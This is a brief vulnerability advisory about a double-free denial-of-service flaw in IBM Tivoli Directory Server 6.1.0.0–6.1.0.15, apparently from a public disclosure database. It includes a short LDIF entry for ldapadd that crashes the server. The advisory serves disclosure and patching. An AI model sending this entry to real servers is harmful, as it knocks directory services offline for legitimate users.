IBM Tivoli Directory Server is prone to a denial-of-service vulnerability because the server contains a double-free error.

An attacker can exploit this issue to crash the affected server with a SIGSEGV fault, denying service to legitimate users.

Tivoli Directory Server 6.1.0.0 - 6.1.0.15 are affected.

The following 'ldapadd' entry is sufficient to trigger the issue:

dn: globalGroupName=GlobalAdminGroup,cn=ibmpolicies
globalGroupName: GlobalAdminGroup
objectclass: top
objectclass: ibm-globalAdminGroup
